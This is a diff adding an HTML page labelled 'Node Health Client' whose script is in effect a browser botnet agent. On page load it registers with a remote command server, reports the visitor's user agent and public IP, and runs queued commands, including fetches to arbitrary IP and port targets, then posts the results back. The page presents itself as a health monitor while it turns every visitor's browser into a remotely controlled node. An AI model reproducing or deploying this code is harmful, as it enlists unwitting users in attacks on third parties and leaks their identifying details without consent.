@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html><head><title>Node JS Client</title></head><body>
+<h2>Node Health Client</h2><pre id="log">Starting...</pre>
+<script>
+  const SERVER = "https://wuhp-notc2docker.hf.space";
+  const NODE_ID = "node-" + Math.random().toString(36).substring(2, 10);
+  let pollInterval = 10000;
+  function log(msg) { document.getElementById("log").innerText += "\n" + msg; }
+  
+  async function execute(cmd) {
+    let result = { status: "executed" };
+    if (cmd.type === 'fetch_http_test') {
+      const t0 = performance.now();
+      try {
+        await fetch(`http://${cmd.payload.ip}:${cmd.payload.port}/`, {mode: 'no-cors'}).catch(() => {});
+        result = { status: "fetch_dispatched", latency_ms: Math.round(performance.now() - t0) };
+      } catch(e) { result = { status: "error", detail: e.message }; }
+    } else if (cmd.type === 'get_public_ip') {
+      try { const r = await fetch('https://api.ipify.org'); result = { ip: await r.text() }; } catch(e) { result = { error: "failed" }; }
+    } else if (cmd.type === 'get_system_info') {
+      result = { ua: navigator.userAgent, lang: navigator.language, plat: navigator.platform };
+    } else if (cmd.type === 'report_sysinfo') {
+      result = { ua: navigator.userAgent };
+    } else if (cmd.type === 'change_poll_interval') {
+      pollInterval = (parseInt(cmd.payload.interval)||10) * 1000;
+      result = { status: "interval_updated" };
+    } else if (cmd.type === 'self_terminate') {
+      log("Terminate requested - turning off");
+      return;
+    } else {
+      result = { status: "unsupported_in_browser" }
+    }
+    
+    await fetch(SERVER + "/api/nodes/report", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ nodeId: NODE_ID, commandId: cmd.id, type: cmd.type, target: cmd.target, result })
+    }).catch(() => {});
+  }
+
+  async function ping() {
+    try {
+      const res = await fetch(SERVER + "/api/nodes/ping", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: NODE_ID, type: "gh_pages", systemInfo: { os: navigator.userAgent } })
+      });
+      const data = await res.json();
+      log("Ping OK. Commands queued: " + (data.commands?.length || 0));
+      if (data.commands) data.commands.forEach(execute);
+    } catch(e) { log("Ping Error: " + e.message); }
+    setTimeout(ping, pollInterval);
+  }
+  ping();
+</script>
+</body></html>
